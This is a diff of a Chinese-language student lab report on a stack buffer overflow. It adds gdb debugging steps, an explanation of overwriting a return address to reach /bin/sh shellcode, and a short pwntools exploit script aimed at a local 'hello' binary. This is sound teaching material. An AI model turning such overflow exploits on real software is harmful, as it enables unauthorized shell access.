@@ -391,7 +391,7 @@
       # 需要系统调用execve函数
       # 寄存器rax中存放的为系统调用编号
       # 这里将rax的值赋为execve函数的系统调用编号0x3b
-       ```
+      ```
    
    2. 参数存放:
    
@@ -426,9 +426,42 @@
    
 7. **漏洞利用：**
 
+   > ① 请在利用脚本`exp.py`中，程序启动之后但是数据发送之前，加入`pause()` 或者`input("continue >") `，使得利用脚本运行时，暂停在发送前。在一个终端窗口(记为 A)运行这一利用脚本；
+>
+   > ② 接着，在另一个终端窗口(记为 B)中，打开 gdb 并执行`attach pid`命令(pid 换成利用运行的终端界面显示的 pid)；
+   >
+   > ③ 然后，在反编译器中找到`scanf`返回时的下一条指令的地址，在 gdb 里用 break 命令下断点；
+   >
+   > ④ 在 gdb 里`continue`，并在终端 A 上输入回车让利用继续运行；
+   >
+   > ⑤ 终端 B 中，gdb 此时应该在断点处停下。从此处开始，单步调试（使用 `ni `跳过下一个 `printf`函数调用）
    
-
+   漏洞利用的机制：
    
+   ​	利用程序针对`hello`程序中存在的未设置用户输入长度检测的漏洞，通过精确控制输入字符串的长度，使得栈缓冲区溢出，覆盖栈中的其他信息，尤其是输入函数的返回地址。通过将返回地址篡改覆盖为shellcode所处地址，即可以利用该漏洞实现shell获取。
+   
+   本实验中用到的利用程序`exp.py`及其中特殊数值的解释
+   
+   ```python
+   #!/usr/bin/python
+   
+   from pwn import *
+   context.arch = 'amd64'
+   r = process("./hello")
+   pause()
+   r.sendline(b"a"*0x18+p64(0x40119e))
+   r.interactive()
+   
+   # 数值解释
+   0x18 
+   # 从输入函数分配的栈空间起始地址到返回地址的差值
+   0x40119e
+   # 被修改的输入函数返回地址，指向/bin/sh的shellcode
+   ```
+   
+   调试结果：
+   
+   ![image-20231017162952109](C:\Users\20149\AppData\Roaming\Typora\typora-user-images\image-20231017162952109.png)
 
 [gdb给指定位置设置断点_gdb 断点 地址-CSDN博客](https://blog.csdn.net/rubikchen/article/details/115588379)
 
